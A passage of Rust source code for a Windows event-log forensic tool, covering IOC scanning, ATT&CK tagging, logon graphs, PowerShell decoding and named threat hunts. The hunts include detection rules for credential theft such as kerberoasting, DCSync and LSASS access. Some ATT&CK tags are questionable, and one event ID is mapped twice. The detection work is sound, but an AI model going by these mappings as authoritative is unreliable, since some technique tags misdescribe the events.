        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    // (kind, value) → (count, first_ts, last_ts, record_ids)
    type Meta = (usize, Option<String>, Option<String>, Vec<u64>);
    let mut seen: HashMap<(IocKind, String), Meta> = HashMap::new();
    let mut total = 0usize;

    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        total += 1;
        let ts = record.timestamp.to_string();
        let record_id = record.event_record_id;

        // Serialize EventData to a flat string for pattern scanning
        let text = if let Some(ed) = record.data.get("Event").and_then(|e| e.get("EventData")) {
            serde_json::to_string(ed).unwrap_or_default()
        } else {
            serde_json::to_string(&record.data).unwrap_or_default()
        };

        for (kind, value) in scan_for_iocs(&text) {
            let entry = seen
                .entry((kind, value))
                .or_insert((0, None, None, Vec::new()));
            entry.0 += 1;
            if entry.1.is_none() {
                entry.1 = Some(ts.clone());
            }
            entry.2 = Some(ts.clone());
            if entry.3.len() < 10 {
                entry.3.push(record_id);
            }
        }
    }

    let mut iocs: Vec<Ioc> = seen
        .into_iter()
        .map(
            |((kind, value), (count, first_seen, last_seen, record_ids))| Ioc {
                value,
                kind,
                count,
                first_seen,
                last_seen,
                record_ids,
            },
        )
        .collect();
    iocs.sort_by(|a, b| b.count.cmp(&a.count).then(a.value.cmp(&b.value)));

    Ok(IocReport {
        events_scanned: total,
        iocs,
    })
}

// ── ATT&CK tagging types ──────────────────────────────────────────────────────

/// A MITRE ATT&CK technique tag derived from an event.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct AttackTag {
    /// ATT&CK technique ID, e.g. `"T1078"` or `"T1059.001"`.
    pub technique_id: String,
    /// Short name for the technique.
    pub technique_name: String,
    /// ATT&CK tactic (e.g. `"Initial Access"`, `"Defense Evasion"`).
    pub tactic: String,
}

// ── ATT&CK static lookup table ────────────────────────────────────────────────

static ATTACK_MAP: OnceLock<HashMap<u32, Vec<AttackTag>>> = OnceLock::new();

fn tag(technique_id: &str, technique_name: &str, tactic: &str) -> AttackTag {
    AttackTag {
        technique_id: technique_id.to_owned(),
        technique_name: technique_name.to_owned(),
        tactic: tactic.to_owned(),
    }
}

fn build_attack_map() -> HashMap<u32, Vec<AttackTag>> {
    let mut m: HashMap<u32, Vec<AttackTag>> = HashMap::new();

    // ── Credential Access ─────────────────────────────────────────────────
    m.insert(4624, vec![tag("T1078", "Valid Accounts", "Initial Access")]);
    m.insert(4625, vec![tag("T1110", "Brute Force", "Credential Access")]);
    m.insert(
        4648,
        vec![tag(
            "T1078.003",
            "Valid Accounts: Local Accounts",
            "Initial Access",
        )],
    );
    m.insert(
        4771,
        vec![tag(
            "T1558.003",
            "Steal or Forge Kerberos Tickets: Kerberoasting",
            "Credential Access",
        )],
    );
    m.insert(
        4776,
        vec![tag(
            "T1003.001",
            "OS Credential Dumping: LSASS Memory",
            "Credential Access",
        )],
    );

    // ── Privilege Escalation / Account Management ─────────────────────────
    m.insert(
        4672,
        vec![tag(
            "T1078.001",
            "Valid Accounts: Default Accounts",
            "Privilege Escalation",
        )],
    );
    m.insert(4728, vec![tag("T1136", "Create Account", "Persistence")]);
    m.insert(4732, vec![tag("T1136", "Create Account", "Persistence")]);
    m.insert(4756, vec![tag("T1136", "Create Account", "Persistence")]);
    m.insert(
        4757,
        vec![tag("T1098", "Account Manipulation", "Persistence")],
    );

    // ── Defense Evasion / Log Tampering ───────────────────────────────────
    m.insert(
        1102,
        vec![tag(
            "T1070.001",
            "Indicator Removal: Clear Windows Event Logs",
            "Defense Evasion",
        )],
    );
    m.insert(
        517,
        vec![tag(
            "T1070.001",
            "Indicator Removal: Clear Windows Event Logs",
            "Defense Evasion",
        )],
    );
    m.insert(
        4719,
        vec![tag(
            "T1562.002",
            "Impair Defenses: Disable Windows Event Logging",
            "Defense Evasion",
        )],
    );

    // ── Execution ─────────────────────────────────────────────────────────
    m.insert(
        4104,
        vec![tag(
            "T1059.001",
            "Command and Scripting Interpreter: PowerShell",
            "Execution",
        )],
    );
    m.insert(
        4688,
        vec![tag(
            "T1059",
            "Command and Scripting Interpreter",
            "Execution",
        )],
    );
    m.insert(
        4698,
        vec![tag(
            "T1053.005",
            "Scheduled Task/Job: Scheduled Task",
            "Execution",
        )],
    );
    m.insert(
        4702,
        vec![tag(
            "T1053.005",
            "Scheduled Task/Job: Scheduled Task",
            "Execution",
        )],
    );

    // ── Persistence ───────────────────────────────────────────────────────
    m.insert(
        7045,
        vec![tag(
            "T1543.003",
            "Create or Modify System Process: Windows Service",
            "Persistence",
        )],
    );
    m.insert(
        4697,
        vec![tag(
            "T1543.003",
            "Create or Modify System Process: Windows Service",
            "Persistence",
        )],
    );

    // ── Lateral Movement ──────────────────────────────────────────────────
    m.insert(
        5145,
        vec![tag(
            "T1021.002",
            "Remote Services: SMB/Windows Admin Shares",
            "Lateral Movement",
        )],
    );
    m.insert(
        4648,
        vec![tag("T1021", "Remote Services", "Lateral Movement")],
    );

    // ── Collection / Discovery ────────────────────────────────────────────
    m.insert(
        4663,
        vec![tag("T1083", "File and Directory Discovery", "Discovery")],
    );
    m.insert(
        4656,
        vec![tag("T1083", "File and Directory Discovery", "Discovery")],
    );

    m
}

/// Return ATT&CK technique tags for the given Windows Event ID.
///
/// Returns an empty slice for event IDs that have no mapping.
/// This is a static lookup — no file I/O is performed.
pub fn attack_tags_for_event_id(event_id: u32) -> &'static [AttackTag] {
    let map = ATTACK_MAP.get_or_init(build_attack_map);
    map.get(&event_id).map(Vec::as_slice).unwrap_or(&[])
}

// ── Pivot / Diff / Process-tree / Logon-graph / Rare-process / Hunt ──────────

/// Diff result: records present in one file but not the other.
#[derive(Debug, serde::Serialize)]
pub struct EvtxDiff {
    pub added: Vec<TimelineEntry>,
    pub removed: Vec<TimelineEntry>,
}

/// A single process-creation event, from EID 4688 or Sysmon EID 1.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ProcessNode {
    pub pid: u64,
    pub parent_pid: u64,
    pub image: String,
    pub command_line: String,
    pub timestamp: String,
}

/// A directed logon edge: source host → target host via a logon type.
#[derive(Debug, Clone, serde::Serialize)]
pub struct LogonEdge {
    pub source: String,
    pub target: String,
    pub logon_type: u32,
    pub count: usize,
}

/// The full logon source–target graph extracted from EID 4624 events.
#[derive(Debug, serde::Serialize)]
pub struct LogonGraph {
    pub nodes: Vec<String>,
    pub edges: Vec<LogonEdge>,
}

/// A process image path seen fewer times than a given threshold.
#[derive(Debug, serde::Serialize)]
pub struct RareProcess {
    pub image: String,
    pub count: usize,
    pub first_seen: String,
    pub last_seen: String,
}

/// Search all string values in every event's JSON blob for a case-insensitive
/// substring match.  Returns matching `TimelineEntry` objects.
/// Exits with detections semantics (caller should use exit 1 if non-empty).
pub fn pivot(path: &Path, query: &str) -> Result<Vec<TimelineEntry>, AnalyzeError> {
    let query_lower = query.to_ascii_lowercase();
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut entries = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        if !value_contains_str(&record.data, &query_lower) {
            continue;
        }
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        entries.push(TimelineEntry {
            record_id: record.event_record_id,
            timestamp: record.timestamp.to_string(),
            event_id: system.and_then(event_id_from_system).unwrap_or(0),
            level: system
                .and_then(|s| s.get("Level"))
                .and_then(serde_json::Value::as_u64)
                .map(|n| n as u8),
            channel: system
                .and_then(|s| s.get("Channel"))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned),
            computer: system
                .and_then(|s| s.get("Computer"))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned),
            provider: system
                .and_then(|s| s.get("Provider"))
                .and_then(|p| p.get("@Name").or_else(|| p.get("@Guid")))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned),
        });
    }
    Ok(entries)
}

fn value_contains_str(v: &serde_json::Value, query: &str) -> bool {
    match v {
        serde_json::Value::String(s) => s.to_ascii_lowercase().contains(query),
        serde_json::Value::Array(arr) => arr.iter().any(|item| value_contains_str(item, query)),
        serde_json::Value::Object(map) => {
            map.values().any(|val| value_contains_str(val, query))
        }
        _ => false,
    }
}

fn value_matches_regex(v: &serde_json::Value, re: &regex::Regex) -> bool {
    match v {
        serde_json::Value::String(s) => re.is_match(s),
        serde_json::Value::Array(arr) => arr.iter().any(|item| value_matches_regex(item, re)),
        serde_json::Value::Object(map) => map.values().any(|val| value_matches_regex(val, re)),
        _ => false,
    }
}

/// Search all event string values for a substring or regex pattern.
///
/// When `use_regex` is false, performs the same case-insensitive substring
/// match as the former `pivot` command.  When true, compiles `query` as a
/// regex and applies it to every string value in the event JSON.
///
/// Returns `Err(AnalyzeError::Parse)` when `use_regex` is true and `query`
/// is not a valid regex.
pub fn search(
    path: &Path,
    query: &str,
    use_regex: bool,
) -> Result<Vec<TimelineEntry>, AnalyzeError> {
    if !use_regex {
        return pivot(path, query);
    }
    let re = regex::Regex::new(query)
        .map_err(|e| AnalyzeError::Parse(format!("invalid regex: {e}")))?;
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;
    let mut entries = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        if !value_matches_regex(&record.data, &re) {
            continue;
        }
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        entries.push(TimelineEntry {
            record_id: record.event_record_id,
            timestamp: record.timestamp.to_string(),
            event_id: system.and_then(event_id_from_system).unwrap_or(0),
            level: system
                .and_then(|s| s.get("Level"))
                .and_then(serde_json::Value::as_u64)
                .map(|n| n as u8),
            channel: system
                .and_then(|s| s.get("Channel"))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned),
            computer: system
                .and_then(|s| s.get("Computer"))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned),
            provider: system
                .and_then(|s| s.get("Provider"))
                .and_then(|p| p.get("@Name").or_else(|| p.get("@Guid")))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned),
        });
    }
    Ok(entries)
}

/// Compare two EVTX files by record ID.  Returns added (in B not A) and
/// removed (in A not B) entries.  Exit 1 when the diff is non-empty.
pub fn diff(a: &Path, b: &Path) -> Result<EvtxDiff, AnalyzeError> {
    let entries_a = timeline(a)?;
    let entries_b = timeline(b)?;
    let ids_a: std::collections::HashSet<u64> =
        entries_a.iter().map(|e| e.record_id).collect();
    let ids_b: std::collections::HashSet<u64> =
        entries_b.iter().map(|e| e.record_id).collect();
    let added = entries_b
        .into_iter()
        .filter(|e| !ids_a.contains(&e.record_id))
        .collect();
    let removed = entries_a
        .into_iter()
        .filter(|e| !ids_b.contains(&e.record_id))
        .collect();
    Ok(EvtxDiff { added, removed })
}

/// Extract process-creation events (Security EID 4688 and Sysmon EID 1) and
/// return a flat list of `ProcessNode` records with PID/PPID/image/cmdline.
pub fn process_tree(path: &Path) -> Result<Vec<ProcessNode>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut nodes = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = system.and_then(event_id_from_system).unwrap_or(0);
        if event_id != 4688 && event_id != 1 {
            continue;
        }
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };
        let (pid, parent_pid, image, command_line) = if event_id == 4688 {
            let pid = event_data_str(ed, "NewProcessId")
                .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
                .unwrap_or(0);
            let ppid = event_data_str(ed, "ProcessId")
                .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
                .unwrap_or(0);
            let image = event_data_str(ed, "NewProcessName").unwrap_or("-").to_owned();
            let cmdline = event_data_str(ed, "CommandLine").unwrap_or("").to_owned();
            (pid, ppid, image, cmdline)
        } else {
            // Sysmon EID 1 — flat JSON object format, integer PIDs
            let pid = sysmon_pid(ed, "ProcessId");
            let ppid = sysmon_pid(ed, "ParentProcessId");
            let image = sysmon_str(ed, "Image").unwrap_or("-").to_owned();
            let cmdline = sysmon_str(ed, "CommandLine").unwrap_or("").to_owned();
            (pid, ppid, image, cmdline)
        };
        nodes.push(ProcessNode {
            pid,
            parent_pid,
            image,
            command_line,
            timestamp: record.timestamp.to_string(),
        });
    }
    Ok(nodes)
}

/// Resolve the true *source* machine from an EID 4624 event's fields.
///
/// For Logon Type 10 (RDP with NLA disabled), `WorkstationName` is written by
/// Windows as the *destination* (the machine being accessed), not the source.
/// `IpAddress` (SourceNetworkAddress) is the reliable source for all logon types.
/// For all other logon types, `WorkstationName` is the source and is preferred
/// over the IP because it gives the hostname.
///
/// Returns `None` when no usable source can be identified (skip the event).
fn resolve_logon_source(logon_type: u32, workstation: &str, ip: &str) -> Option<String> {
    let ip_usable = !ip.is_empty() && ip != "-" && ip != "::1" && ip != "127.0.0.1";
    if logon_type == 10 {
        // RDP (RemoteInteractive): WorkstationName = destination; only trust IpAddress.
        ip_usable.then(|| ip.to_owned())
    } else {
        let ws_usable = !workstation.is_empty() && workstation != "-";
        if ws_usable {
            Some(workstation.to_owned())
        } else if ip_usable {
            Some(ip.to_owned())
        } else {
            None
        }
    }
}

/// Build a logon source→target graph from EID 4624 events.
pub fn logon_graph(path: &Path) -> Result<LogonGraph, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut edge_map: HashMap<(String, String, u32), usize> = HashMap::new();

    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        if system.and_then(event_id_from_system) != Some(4624) {
            continue;
        }
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };
        let computer = system
            .and_then(|s| s.get("Computer"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or("-")
            .to_owned();
        let workstation =
            event_data_str(ed, "WorkstationName").unwrap_or("").to_owned();
        let ip = event_data_str(ed, "IpAddress").unwrap_or("").to_owned();
        let logon_type: u32 = event_data_str(ed, "LogonType")
            .and_then(|s| s.parse().ok())
            .unwrap_or(0);

        let source = match resolve_logon_source(logon_type, &workstation, &ip) {
            Some(s) => s,
            None => continue,
        };

        *edge_map.entry((source, computer, logon_type)).or_insert(0) += 1;
    }

    let mut node_set = std::collections::HashSet::new();
    let mut edges = Vec::new();
    for ((source, target, logon_type), count) in edge_map {
        node_set.insert(source.clone());
        node_set.insert(target.clone());
        edges.push(LogonEdge { source, target, logon_type, count });
    }

    let mut nodes: Vec<String> = node_set.into_iter().collect();
    nodes.sort();
    edges.sort_by(|a, b| a.source.cmp(&b.source));

    Ok(LogonGraph { nodes, edges })
}

/// Return process images seen fewer than `threshold` times (EID 4688 / Sysmon 1).
pub fn rare_processes(path: &Path, threshold: usize) -> Result<Vec<RareProcess>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    // image → (count, first_seen, last_seen)
    let mut freq: HashMap<String, (usize, String, String)> = HashMap::new();

    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = system.and_then(event_id_from_system).unwrap_or(0);
        if event_id != 4688 && event_id != 1 {
            continue;
        }
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };
        let image_opt: Option<&str> = if event_id == 4688 {
            event_data_str(ed, "NewProcessName")
        } else {
            sysmon_str(ed, "Image")
        };
        if let Some(img) = image_opt {
            let img = img.to_owned();
            let ts = record.timestamp.to_string();
            let entry = freq.entry(img).or_insert_with(|| (0, ts.clone(), ts.clone()));
            entry.0 += 1;
            if ts < entry.1 {
                entry.1 = ts.clone();
            }
            if ts > entry.2 {
                entry.2 = ts;
            }
        }
    }

    let mut result: Vec<RareProcess> = freq
        .into_iter()
        .filter(|(_, (count, _, _))| *count < threshold)
        .map(|(image, (count, first_seen, last_seen))| RareProcess {
            image,
            count,
            first_seen,
            last_seen,
        })
        .collect();
    result.sort_by_key(|r| r.count);
    Ok(result)
}

/// Run a named threat hunt against an EVTX file.
///
/// Supported names: `kerberoast`, `asrep`, `dcsync`, `lateral-smb`,
/// `wmi-persistence`, `scheduled-task`, `lsass-access`, `defender-tamper`.
///
/// Returns `Err(AnalyzeError::UnknownHunt)` for unrecognised names.
/// Returns exit-code-1 semantics when the result vec is non-empty.
pub fn hunt(path: &Path, name: &str) -> Result<Vec<TimelineEntry>, AnalyzeError> {
    let hunt_eids: &[u32] = match name {
        "kerberoast" => &[4769],
        "asrep" => &[4768],
        "dcsync" => &[4662],
        "lateral-smb" => &[5140, 5145],
        "wmi-persistence" => &[5860, 5861],
        "scheduled-task" => &[4698, 4702],
        "lsass-access" => &[10],
        "defender-tamper" => &[5007, 5001],
        _ => return Err(AnalyzeError::UnknownHunt(name.to_owned())),
    };

    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut hits = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id) => id,
            None => continue,
        };
        if !hunt_eids.contains(&event_id) {
            continue;
        }
        let ed = record.data.get("Event").and_then(|e| e.get("EventData"));

        let matches = match name {
            "kerberoast" => ed
                .and_then(|d| event_data_str(d, "TicketEncryptionType"))
                .map(|enc| enc == "0x17" || enc == "0x12" || enc == "23" || enc == "18")
                .unwrap_or(false),
            "asrep" => ed
                .and_then(|d| event_data_str(d, "PreAuthType"))
                .map(|t| t == "0")
                .unwrap_or(false),
            "dcsync" => ed
                .map(|d| {
                    let access = event_data_str(d, "AccessMask").unwrap_or("");
                    let obj_server =
                        event_data_str(d, "ObjectServer").unwrap_or("");
                    obj_server.contains("Directory Service") || access.contains("0x100")
                })
                .unwrap_or(false),
            "lateral-smb" => ed
                .and_then(|d| event_data_str(d, "ShareName"))
                .map(|share| {
                    let s = share.to_ascii_uppercase();
                    s.contains("ADMIN$") || s.contains("\\C$") || s.contains("IPC$")
                })
                .unwrap_or(false),
            "lsass-access" => ed
                .and_then(|d| event_data_str(d, "TargetImage"))
                .map(|img| img.to_ascii_lowercase().contains("lsass"))
                .unwrap_or(false),
            // EID match is sufficient for these hunts
            "wmi-persistence" | "scheduled-task" | "defender-tamper" => true,
            _ => false,
        };

        if matches {
            hits.push(TimelineEntry {
                record_id: record.event_record_id,
                timestamp: record.timestamp.to_string(),
                event_id,
                level: system
                    .and_then(|s| s.get("Level"))
                    .and_then(serde_json::Value::as_u64)
                    .map(|n| n as u8),
                channel: system
                    .and_then(|s| s.get("Channel"))
                    .and_then(serde_json::Value::as_str)
                    .map(str::to_owned),
                computer: system
                    .and_then(|s| s.get("Computer"))
                    .and_then(serde_json::Value::as_str)
                    .map(str::to_owned),
                provider: system
                    .and_then(|s| s.get("Provider"))
                    .and_then(|p| p.get("@Name").or_else(|| p.get("@Guid")))
                    .and_then(serde_json::Value::as_str)
                    .map(str::to_owned),
            });
        }
    }
    Ok(hits)
}

// ── PowerShell deobfuscation ──────────────────────────────────────────────────

/// Detect and decode a PowerShell `-EncodedCommand` (or `-enc` / `-ec`) payload.
///
/// Windows PowerShell encodes commands as Base64 of UTF-16LE bytes.
/// Returns `Some(decoded)` when detected, `None` for plain scripts.
pub fn deobfuscate_ps(text: &str) -> Option<String> {
    use base64::{Engine as _, engine::general_purpose::STANDARD};

    let flags = ["-encodedcommand", "-enc", "-ec", "-en"];
    let tokens: Vec<&str> = text.split_whitespace().collect();
    for (i, tok) in tokens.iter().enumerate() {
        if flags.contains(&tok.to_ascii_lowercase().as_str()) {
            if let Some(payload) = tokens.get(i + 1) {
                if let Ok(bytes) = STANDARD.decode(payload) {
                    // Interpret as UTF-16LE
                    let utf16: Vec<u16> = bytes
                        .chunks_exact(2)
                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
                        .collect();
                    return Some(String::from_utf16_lossy(&utf16));
                }
            }
        }
    }
    None
}

// ── Frequency anomaly scoring ─────────────────────────────────────────────────

/// One event ID's anomaly record.
#[derive(Debug, serde::Serialize)]
pub struct AnomalyEntry {
    pub event_id: u32,
    pub count: usize,
    pub z_score: f64,
}

/// Compute a z-score frequency anomaly for every event ID in `path`.
///
/// Returns all entries with `|z_score| >= min_z`, sorted descending by `|z_score|`.
/// A `min_z` of `0.0` returns all event IDs.
pub fn anomaly(path: &Path, min_z: f64) -> Result<Vec<AnomalyEntry>, AnalyzeError> {
    let report = frequency(path)?;
    let counts: Vec<f64> = report.by_event_id.iter().map(|f| f.count as f64).collect();
    if counts.is_empty() {
        return Ok(vec![]);
    }
    let mean = counts.iter().sum::<f64>() / counts.len() as f64;
    let variance = counts.iter().map(|c| (c - mean).powi(2)).sum::<f64>() / counts.len() as f64;
    let std_dev = variance.sqrt();

    let mut entries: Vec<AnomalyEntry> = report
        .by_event_id
        .iter()
        .map(|f| {
            let z = if std_dev > 0.0 {
                (f.count as f64 - mean) / std_dev
            } else {
                0.0
            };
            AnomalyEntry { event_id: f.event_id, count: f.count, z_score: z }
        })
        .filter(|e| e.z_score.abs() >= min_z)
        .collect();

    entries.sort_by(|a, b| b.z_score.abs().partial_cmp(&a.z_score.abs()).unwrap_or(std::cmp::Ordering::Equal));
    Ok(entries)
}

// ── Schema-aware field extraction ─────────────────────────────────────────────

/// Frequency-ranked extracted field value.
#[derive(Debug, serde::Serialize)]
pub struct FieldValue {
    pub value: String,
    pub count: usize,
}

/// Extract all unique values of a named field across all events in `path`,
/// returned frequency-ranked (most common first).
pub fn extract_field(path: &Path, field: &str) -> Result<Vec<FieldValue>, AnalyzeError> {
    use std::collections::HashMap;
    let mut parser = evtx::EvtxParser::from_path(path)
        .map_err(|e| AnalyzeError::Parse(e.to_string()))?;
    let mut counts: HashMap<String, usize> = HashMap::new();

    for record in parser.records_json_value() {
        let Ok(record) = record else { continue };
        collect_field_values(&record.data, field, &mut counts);
    }

    let mut result: Vec<FieldValue> = counts
        .into_iter()
        .map(|(value, count)| FieldValue { value, count })
        .collect();
    result.sort_by(|a, b| b.count.cmp(&a.count));
    Ok(result)
}

/// Recursively collect all string values of `field_name` from a JSON tree.
fn collect_field_values(v: &serde_json::Value, field_name: &str, out: &mut std::collections::HashMap<String, usize>) {
    match v {
        serde_json::Value::Object(map) => {
            for (k, val) in map {
                if k == field_name {
                    if let Some(s) = val.as_str() {
                        *out.entry(s.to_owned()).or_insert(0) += 1;
                    }
                }
                collect_field_values(val, field_name, out);
            }
        }
        serde_json::Value::Array(arr) => {
            for item in arr {
                collect_field_values(item, field_name, out);
            }
        }
        _ => {}
    }
}

// ── Lateral movement (EID 4648/4769/4776) ────────────────────────────────────

/// Extract lateral-movement indicators from EID 4648 (explicit logon),
/// 4769 (Kerberos service ticket), and 4776 (NTLM auth attempt).
pub fn lateral_movement(path: &Path) -> Result<Vec<LateralMovementEvent>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut events = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id) if matches!(id, 4648 | 4769 | 4776) => id,
            _ => continue,
        };
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(e) => e,
            None => continue,
        };

        let ev = match event_id {
            4648 => {
                // Explicit credential logon (RunAs / Pass-the-Hash indicator)
                let logon_type = event_data_str(ed, "LogonType")
                    .and_then(|s| s.parse::<u32>().ok());
                LateralMovementEvent {
                    timestamp: record.timestamp.to_string(),
                    event_id,
                    source_user: event_data_str(ed, "SubjectUserName").map(str::to_owned),
                    target_user: event_data_str(ed, "TargetUserName").map(str::to_owned),
                    target_host: event_data_str(ed, "TargetServerName").map(str::to_owned),
                    logon_type,
                    auth_package: None,
                    encryption_type: None,
                }
            }
            4769 => {
                // Kerberos service ticket request — flag RC4/DES encryption
                let enc_raw = event_data_str(ed, "TicketEncryptionType");
                let enc_type = enc_raw.map(|s| {
                    // Parse hex (e.g. "0x17") or decimal
                    let n = if let Some(h) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
                        u64::from_str_radix(h, 16).ok()
                    } else {
                        s.parse::<u64>().ok()
                    };
                    match n {
                        Some(0x17) => "RC4".to_owned(),
                        Some(0x01) | Some(0x03) => "DES".to_owned(),
                        Some(0x11) | Some(0x12) => "AES".to_owned(),
                        _ => s.to_owned(),
                    }
                });
                LateralMovementEvent {
                    timestamp: record.timestamp.to_string(),
                    event_id,
                    source_user: event_data_str(ed, "TargetUserName").map(str::to_owned),
                    target_user: event_data_str(ed, "ServiceName").map(str::to_owned),
                    target_host: event_data_str(ed, "ClientAddress").map(str::to_owned),
                    logon_type: None,
                    auth_package: Some("Kerberos".to_owned()),
                    encryption_type: enc_type,
                }
            }
            4776 => {
                // NTLM credential validation
                LateralMovementEvent {
                    timestamp: record.timestamp.to_string(),
                    event_id,
                    source_user: event_data_str(ed, "TargetUserName").map(str::to_owned),
                    target_user: None,
                    target_host: event_data_str(ed, "Workstation").map(str::to_owned),
                    logon_type: None,
                    auth_package: event_data_str(ed, "PackageName").map(str::to_owned),
                    encryption_type: None,
                }
            }
            _ => continue,
        };
        events.push(ev);
    }
    Ok(events)
}

// ── RDP sessions (EID 4778/4779) ─────────────────────────────────────────────

/// Extract RDP session events from EID 4778 (reconnected) and 4779 (disconnected).
pub fn rdp_sessions(path: &Path) -> Result<Vec<RdpSessionEvent>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut events = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id) if matches!(id, 4778 | 4779) => id,
            _ => continue,
        };
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(e) => e,
            None => continue,
        };
        let session_id = event_data_str(ed, "SessionID")
            .and_then(|s| s.parse::<u32>().ok());
        events.push(RdpSessionEvent {
            timestamp: record.timestamp.to_string(),
            event_id,
            user: event_data_str(ed, "AccountName").map(str::to_owned),
            session_id,
            source_ip: event_data_str(ed, "ClientAddress").map(str::to_owned),
        });
    }
    Ok(events)
}

// ── SMB share access (EID 5140/5145) ─────────────────────────────────────────

/// Extract SMB share access events from EID 5140 (share accessed) and
/// 5145 (share object access check).
pub fn smb_access(path: &Path) -> Result<Vec<SmbAccessEvent>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut events = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id) if matches!(id, 5140 | 5145) => id,
            _ => continue,
        };
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(e) => e,
            None => continue,
        };
        events.push(SmbAccessEvent {
            timestamp: record.timestamp.to_string(),
            event_id,
            subject_user: event_data_str(ed, "SubjectUserName").map(str::to_owned),
            share_name: event_data_str(ed, "ShareName").map(str::to_owned),
            share_path: event_data_str(ed, "ShareLocalPath").map(str::to_owned),
            relative_target: event_data_str(ed, "RelativeTargetName").map(str::to_owned),
            ip_address: event_data_str(ed, "IpAddress").map(str::to_owned),
        });
    }
    Ok(events)
}

// ── Microsoft Defender events (EID 1006/1116/1117) ───────────────────────────

/// Extract Microsoft Defender events from EID 1116 (malware detected),
/// 1117 (action taken), and 1006 (scan result — malware found).
pub fn defender_events(path: &Path) -> Result<Vec<DefenderEvent>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut events = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id) if matches!(id, 1006 | 1116 | 1117) => id,
            _ => continue,
        };
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(e) => e,
            None => continue,
        };
        // Defender logs use both named-attribute array AND flat-object formats
        // depending on the Windows version; event_data_str handles both shapes.
